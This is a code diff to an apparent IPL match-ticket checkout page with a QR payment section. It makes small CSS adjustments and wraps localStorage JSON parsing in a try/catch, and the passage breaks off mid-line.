@@ -27,17 +27,17 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         
-        body { font-family: 'Inter', sans-serif; background: #eef2f6; margin: 0; padding: 20px 15px 120px 15px; text-align: center; color: #111827; }
+        body { font-family: 'Inter', sans-serif; background: #eef2f6; margin: 0; padding: 20px 15px; text-align: center; color: #111827; }
         
         /* ⏳ Timer Banner */
         .timer-banner { background: #fffbe6; color: #d68100; padding: 10px 15px; font-size: 13px; font-weight: 700; border-radius: 50px; max-width: max-content; margin: 0 auto 20px auto; border: 1px solid #ffe58f; display: flex; align-items: center; gap: 8px; box-shadow: 0 4px 12px rgba(214, 129, 0, 0.1); }
         .timer-banner svg { width: 16px; height: 16px; }
 
         /* Main Card */
-        .checkout-box { background: #fff; max-width: 420px; margin: auto; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.06); border: 1px solid #f3f4f6; position: relative;}
+        .checkout-box { background: #fff; max-width: 420px; margin: auto; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.06); border: 1px solid #f3f4f6; }
         
         /* Header */
-        .checkout-header { background: linear-gradient(135deg, #0052FF 0%, #0036b3 100%); color: #fff; padding: 24px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .checkout-header { background: linear-gradient(135deg, #0052FF 0%, #0036b3 100%); color: #fff; padding: 24px 20px; display: flex; justify-content: space-between; align-items: center; }
         .checkout-header .title { font-weight: 700; font-size: 16px; letter-spacing: 0.5px; display: flex; align-items: center; gap: 6px;}
         .checkout-header .amount { font-size: 24px; font-weight: 800; }
 
@@ -57,7 +57,7 @@
         /* QR Section */
         .qr-section { padding: 15px 20px 25px; }
         
-        /* 📸 Safe Corner Viewfinder Animation (No Green Line) */
+        /* 📸 Screenshot Safe Viewfinder Animation (Green Line Removed) */
         .qr-container { position: relative; width: 220px; height: 220px; margin: 0 auto; border-radius: 16px; border: 1px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.03); overflow: hidden; display: none;}
         #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; position: relative; z-index: 1;}
         
@@ -82,7 +82,7 @@
         .btn-action svg { width: 14px; height: 14px; }
 
         /* Trust Logos */
-        .trust-logos { margin-top: 25px; display: flex; justify-content: center; align-items: center; gap: 18px; }
+        .trust-logos { margin-top: 20px; display: flex; justify-content: center; align-items: center; gap: 18px; }
         .trust-logos img { height: 20px; filter: grayscale(100%); opacity: 0.5; transition: 0.3s; }
         .trust-logos img:hover { filter: grayscale(0%); opacity: 1; }
 
@@ -228,7 +228,14 @@
 
         // --- ORDER SUMMARY LOGIC ---
         const finalPrice = localStorage.getItem('finalPrice') || 0;
-        const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "IPL Match Ticket";
+        let matchTitle = "IPL Match Ticket";
+        try {
+            const savedMatch = localStorage.getItem('selectedMatch');
+            if(savedMatch) {
+                const parsed = JSON.parse(savedMatch);
+                if(parsed && parsed.title) matchTitle = parsed.title;
+            }
+        } catch(e) {}
         
         document.getElementById('p-amt').innerText = "₹" + finalPrice;
         document.getElementById('s-match').innerText = matchTitle;
@@ -359,7 +366,4 @@
         const price = localStorage.getItem('finalPrice') || 0;
         const qrImg = document.getElementById('qr-code');
         const qrMsg = document.getElementById('qr-msg');
-        const qrWrapper = document.getElementById('qr-wrapper');
-        const qrActions = document.getElementById('qr-actions-box'); // Utility buttons wrapper
-
-        t
+        const qrWrapper = do
